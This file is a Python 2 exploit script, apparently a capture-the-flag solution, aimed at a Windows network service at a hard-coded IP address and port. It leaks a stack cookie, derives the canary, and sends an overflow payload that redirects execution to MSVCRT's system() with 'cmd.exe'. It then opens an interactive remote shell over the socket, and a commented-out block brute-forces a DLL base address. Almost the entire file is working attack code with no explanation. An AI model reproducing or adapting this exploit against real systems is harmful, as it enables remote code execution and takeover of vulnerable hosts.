import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '146.148.79.13'
port = 55173

write_iat = 0x4020a8
write_addr = 0x7ef1d260 

atoi_iat = 0x4020a4
atoi_addr = 0x7ef4d9a0

dll_base = 0x7d400000 #- 0x44260 #atoi_addr & 0xfff00000

base = 0x32f000
content = ''

'''
while(True):
	print 'address: %s' % hex(dll_base)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	f = s.makefile('rw', bufsize=0)

	f.write(str(dll_base) + '\n')
	content = f.read(4096).replace('\r\n', '\n')
	if ('\xcd\x80' in content): 
		print content

	dll_base += 0x1000
#for x in range(0x1000 / 0x4):
#	print '%s: %s' % (hex(base + 4 * x), hex(up(content[4 * x : 4 * x + 4])))
'''

main_addr = 0x401000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

raw_input('input')

payload = '4206592XAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR'
payload += p(main_addr)
payload += 'TTTTUUUUVVVVWWWWXXXXYYYYZZZZ'

f.write(payload + '\n')
content = f.read(0x1000)
print len(content)
cookie_hash = up(content[0:4])
print 'cookie: %s' % hex(cookie_hash)
stack_canary = cookie_hash ^ 0x32f538

# /bin/sh at 0x32f528
# cmd.exe at 0x32f548
MSVCRT_system = 0x7ef1d260-0x44260+0x05bce0
payload = str(0x32f000) + 'X/bin/sh\x00' + p(stack_canary) + 'AAAABBBB'
payload += p(MSVCRT_system)
payload += 'DDDD'
payload += p(0x32f548)
payload += 'cmd.exe'
#payload += 

f.write(payload + '\n')

'''
content = f.read(4096).replace('\r\n', '\n')

if (len(content) != 0): 
	print len(content)

try:
	for x in range(0x1000 / 0x4):
		print '%s: %s' % (hex(base + 4 * x), hex(up(content[4 * x : 4 * x + 4])))
except:
	pass
'''

t = telnetlib.Telnet()
t.sock = s
t.interact()
